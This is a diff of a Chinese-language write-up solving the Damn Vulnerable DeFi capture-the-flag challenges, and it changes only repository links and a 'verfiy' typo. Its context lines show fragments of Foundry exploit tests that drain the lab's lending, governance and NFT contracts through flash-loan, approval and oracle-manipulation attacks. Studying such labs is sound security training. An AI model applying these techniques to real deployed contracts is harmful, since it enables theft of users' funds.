@@ -48,7 +48,7 @@ assert(poolBalance == balanceBefore);
 
 
 
-[Unstoppable.t.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/30349eba073206fe6b1c9acd26930468e543e064/src/test/Unstoppable.t.sol#L59-L64)
+[Unstoppable.t.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/test/Unstoppable.t.sol#L59-L64)
 
 ```
 forge test --match-contract Unstoppable -vvvv
@@ -117,7 +117,7 @@ uint256 private constant FIXED_FEE = 1 ether;
 
 使用 foundry 编写测试:
 
-[NaiveReceiver.t.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/30349eba073206fe6b1c9acd26930468e543e064/src/test/NaiveReceiver.t.sol#L48-L55)
+[NaiveReceiver.t.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/test/NaiveReceiver.t.sol#L48-L55)
 
 ```solidity
     function testExploit() public {
@@ -178,7 +178,7 @@ forge test --match-contract NaiveReceiver -vvvv
 
 
 使用 foundry 编写测试:
-[Truster.t.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/b96aacfd662b555a42a225950a200665e86f8304/src/test/Truster.t.sol#L35-L42)
+[Truster.t.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/test/Truster.t.sol#L35-L42)
 
 ```solidity
     function testExploit() public {
@@ -187,7 +187,7 @@ forge test --match-contract NaiveReceiver -vvvv
         trusterLenderPool.flashLoan(0, address(attacker), address(dvt), approve_func_sign);
         dvt.transferFrom(address(trusterLenderPool), address(attacker), TOKENS_IN_POOL);
         vm.stopPrank();
-        verfiy();
+        verify();
     }
 ```
 
@@ -249,7 +249,7 @@ forge test --match-contract Truster -vvvv
         payload = new PayLoad(address(sideEntranceLenderPool));
         payload.start();
         vm.stopPrank();
-        verfiy();
+        verify();
     }
 //..    
 contract PayLoad {
@@ -343,7 +343,7 @@ contract TheRewarder is Test{
         payload = new PayLoad(flashLoanerPool, theRewarderPool, dvt);
         payload.startAttack();
         vm.stopPrank();
-        verfiy();
+        verify();
    	//..
     }
  }
@@ -410,7 +410,7 @@ contract Selfie is Test {
         utils.mineTime(2 days);
         simpleGovernance.executeAction(payload.actionId());
         vm.stopPrank();  
-        verfiy();
+        verify();
     }
 //...    
 }
@@ -497,7 +497,7 @@ forge test --match-contract Selfie -vvv
         damnValuableNFT.approve(address(exchange), 0);
         exchange.sellOne(0);
         vm.stopPrank();
-        verfiy();
+        verify();
     }
 ```
 
@@ -534,7 +534,7 @@ Uniswap v1 合约目前有 10 ETH 和 10 DVT 的流动性的池子,从余额 25 
          uniswapExchange.tokenToEthSwapInput(dvt.balanceOf(attacker), 9 ether, block.timestamp + 100000);
          puppetPool.borrow{value: attacker.balance}(dvt.balanceOf(address(puppetPool)));
          vm.stopPrank();
-         verfiy();
+         verify();
      }
  ```
 
@@ -576,7 +576,7 @@ forge test --match-contract PuppetPool -vvvv
         weth.approve(address(puppetV2Pool), type(uint256).max);
         puppetV2Pool.borrow(dvt.balanceOf(address(puppetV2Pool)));
         vm.stopPrank();
-        verfiy();
+        verify();
     }
 ```
 
@@ -671,7 +671,7 @@ contract FreeRider is Test {
         payload = new PayLoad(uniswapV2Pair, weth, freeRiderNFTMarketplace, freeRiderBuyer, damnValuableNFT);
         payload.Start();
         vm.stopPrank();
-        verfiy();
+        verify();
     }
 //..
 }
@@ -837,7 +837,7 @@ contract Backdoor is Test {
         payload = new PayLoad(masterCopy, dvt, walletRegistry, walletFactory);
         payload.Start(users);
         vm.stopPrank();
-        verfiy();
+        verify();
     }	
 //...
 }
